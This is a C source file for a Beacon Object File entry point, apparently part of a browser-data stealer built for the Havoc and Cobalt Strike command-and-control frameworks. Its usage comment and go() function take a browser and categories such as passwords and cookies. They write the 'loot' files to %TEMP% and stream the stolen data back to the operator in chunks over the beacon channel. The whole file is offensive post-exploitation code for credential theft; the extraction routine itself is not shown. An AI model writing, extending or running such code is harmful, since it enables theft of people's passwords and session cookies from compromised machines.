/* bof/entry.c - Beacon Object File entry point (go()).
 * Usage (from Havoc `coffloader` / CS `beacon> `):
 *
 *   browserdata <browser|all> <categories|all> <json|csv> [verbose]
 *
 * Examples:
 *   browserdata all all json 0
 *   browserdata chrome passwords,cookies json 1
 *
 * Loot files are written to %TEMP%\hbd and can be pulled with `download`.
 * A compact summary is printed to the operator; verbose=1 streams the full
 * JSON/CSV through the callback (chunked). */
#include "../common/beacon.h"
#include "../core/bd.h"

/* BOF string args come as length-prefixed buffers; BeaconDataExtract returns
 * NUL-terminated strings, so no manual duplication is needed. */

static void bof_log(void *ctx, const char *fmt, ...) {
    char buf[1024];
    va_list ap;
    extern int _vsnprintf(char *, size_t, const char *, va_list);
    (void)ctx;
    va_start(ap, fmt);
    _vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    buf[sizeof(buf) - 1] = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
}

#define CHUNK_SIZE 3800
static void bof_chunk(void *ctx, const char *data, int len) {
    (void)ctx;
    {
        int off = 0;
        while (off < len) {
            int take = len - off;
            if (take > CHUNK_SIZE) take = CHUNK_SIZE;
            BeaconOutput(CALLBACK_OUTPUT, (char *)data + off, take);
            off += take;
        }
    }
}

void go(char *args, int alen) {
    formatp f;
    char *brKey, *catSpec, *fmtSpec;
    int verbose;
    int catMask, fmt = BD_FMT_JSON;
    bd_out out;
    int files;
    char *outdir;

    BeaconDataParse(&f, args, alen);
    brKey   = BeaconDataExtract(&f, NULL);   /* NUL-terminated */
    catSpec = BeaconDataExtract(&f, NULL);
    fmtSpec = BeaconDataExtract(&f, NULL);
    verbose = BeaconDataInt(&f);

    if (fmtSpec && (fmtSpec[0] == 'c' || fmtSpec[0] == 'C'))
        fmt = BD_FMT_CSV;

    catMask = bd_cat_mask_parse(catSpec);

    outdir = bd_temp_dir();
    if (!outdir) {
        BeaconPrintf(CALLBACK_ERROR, "[-] cannot resolve %%TEMP%%");
        return;
    }
    out.logf = bof_log;
    out.chunk = bof_chunk;
    out.ctx = NULL;
    out.outDir = outdir;
    out.fmt = fmt;
    out.verbose = verbose;

    files = bd_run(brKey && brKey[0] ? brKey : "all", catMask, &out, NULL);
    if (files < 0)
        BeaconPrintf(CALLBACK_ERROR, "[-] extraction failed");
}
